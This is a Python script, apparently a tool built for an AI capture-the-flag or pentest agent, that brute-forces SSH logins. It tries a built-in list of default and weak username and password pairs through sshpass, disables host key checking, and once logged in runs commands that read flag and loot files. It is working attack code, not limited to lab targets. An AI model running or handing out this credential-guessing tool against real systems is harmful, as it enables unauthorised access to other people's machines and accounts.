#!/usr/bin/env python3
"""Deterministic default-credential sweep (`cred-sweep`).

Weak/default SSH credentials are one of the most common real-world footholds, but the model is
inconsistent at driving a brute + then logging in with the result. This closes it deterministically
and self-contained: try a small curated set of default credentials over SSH with sshpass (no hydra
dependency — hydra lives on the BlackArch arsenal, this runs anywhere sshpass does), stop on the
first that works, and read the flag / common loot from the account. Online-safe: the list is small
and bounded (curated defaults, not rockyou) so it won't hammer a service.

  cred-sweep --target 10.0.0.5
  cred-sweep --target 10.0.0.5 --userlist /usr/share/wordlists/users.txt --passlist .../passwords.txt

Pure: the credential pairs, the per-try ssh command, and the success check. The sweep loop is I/O."""
import argparse
import subprocess
import sys

# Curated default/weak credentials — small + bounded so this is fast and online-safe (NOT rockyou).
_USERS = ["root", "admin", "user", "test", "guest", "operator", "ubuntu", "pi",
          "oracle", "postgres", "mysql", "deploy", "service", "administrator"]
_PASSWORDS = ["root", "admin", "password", "toor", "123456", "password123", "letmein",
              "changeme", "admin123", "P@ssw0rd", "12345678", "welcome", "qwerty", ""]
# A few well-known exact pairs that aren't in the cross-product priority order.
_EXTRA = [("admin", "admin"), ("admin", "password"), ("pi", "raspberry"),
          ("user", "user"), ("guest", "guest")]

_FLAG_READ = "id; cat ~/flag.txt 2>/dev/null; cat /root/flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null"


def builtin_pairs() -> list:
    """Bounded, deduped (user, password) pairs to try, well-known exact pairs first."""
    out: list = []
    seen: set = set()

    def add(u, p):
        if (u, p) not in seen:
            seen.add((u, p))
            out.append((u, p))

    for u, p in _EXTRA:
        add(u, p)
    for u in _USERS:
        add(u, u)                 # username == password is extremely common
    for u in _USERS:
        for p in _PASSWORDS:
            add(u, p)
    return out[:400]


def ssh_try_cmd(target: str, user: str, pw: str, remote: str = _FLAG_READ) -> str:
    """One sshpass attempt that runs `remote` on success. Short timeouts so a closed/filtered port or
    a wrong password fails fast instead of hanging the sweep."""
    return (f"sshpass -p {pw!r} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            f"-o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password "
            f"{user}@{target} {remote!r}")


def parse_success(output: str) -> bool:
    """A login worked if the remote command actually ran (id output) or a flag came back."""
    low = (output or "").lower()
    return "uid=" in low or "grin{" in low


def _read_pairs(userlist, passlist) -> list:
    try:
        if userlist and passlist:
            us = [u.strip() for u in open(userlist) if u.strip()]
            ps = [p.rstrip("\n") for p in open(passlist)]
            pairs = [(u, u) for u in us] + [(u, p) for u in us for p in ps]
            seen, out = set(), []
            for x in pairs:
                if x not in seen:
                    seen.add(x)
                    out.append(x)
            return out[:600]
    except OSError:
        pass
    return builtin_pairs()


def run(target: str, userlist=None, passlist=None) -> str:
    for user, pw in _read_pairs(userlist, passlist):
        cmd = ssh_try_cmd(target, user, pw)
        try:
            r = subprocess.run(["sh", "-c", cmd], capture_output=True, text=True, timeout=12)
        except Exception:  # noqa: BLE001
            continue
        out = (r.stdout or "") + (r.stderr or "")
        if parse_success(out):
            return f"[cred-sweep] valid SSH login {user}:{pw} on {target}\n{out}"
    return f"[cred-sweep] no default SSH credential worked on {target}"


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="cred-sweep",
                                 description="Deterministic default-credential SSH sweep")
    ap.add_argument("--target", required=True)
    ap.add_argument("--userlist", default=None)
    ap.add_argument("--passlist", default=None)
    a = ap.parse_args(argv)
    print(run(a.target, a.userlist, a.passlist))
    return 0


if __name__ == "__main__":
    sys.exit(main())
